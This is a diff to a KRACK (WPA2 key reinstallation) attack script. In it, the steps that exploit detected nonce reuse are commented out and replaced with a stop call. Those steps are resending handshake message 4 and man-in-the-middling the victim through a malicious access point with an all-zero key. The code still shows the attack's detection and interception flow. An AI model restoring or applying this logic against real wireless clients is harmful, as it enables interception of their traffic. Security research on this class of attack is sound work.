@@ -348,18 +348,20 @@ class KRAckAttack():
 				# If the same keystream is reused, we have a normal key reinstallation attack
 				if keystream == client.get_keystream(iv):
 					log(STATUS, "SUCCESS! Nonce and keystream reuse detected (IV=%d)." % iv, color="green", showtime=False)
-					client.update_state(ClientState.Success_Reinstalled)
-					self.sock_real.send(client.msg4, True, self.netconfig.real_channel)
+					# client.update_state(ClientState.Success_Reinstalled)
+					# self.sock_real.send(client.msg4, True, self.netconfig.real_channel)
+					self.stop()
 
 				# Otherwise the client likely installed a new key, i.e., probably an all-zero key
 				else:
 					log(STATUS, "SUCCESS! Nonce reuse detected (IV=%d), with usage of all-zero encryption key." % iv, color="green", showtime=False)
-					log(STATUS, "Now MitM'ing the victim using our malicious AP, and interceptig its traffic.", color="green", showtime=False)
+					# log(STATUS, "Now MitM'ing the victim using our malicious AP, and interceptig its traffic.", color="green", showtime=False)
 
-					self.hostapd_add_allzero_client(client)
+					# self.hostapd_add_allzero_client(client)
 
 					# The client is now no longer MitM'ed by this script (i.e. no frames forwarded between channels)
-					client.update_state(ClientState.Success_AllzeroKey)
+					# client.update_state(ClientState.Success_AllzeroKey)
+					self.stop()
 
 			elif client.attack_timeout(iv):
 				log(WARNING, "KRAck Attack against %s seems to have failed" % client.macaddr)
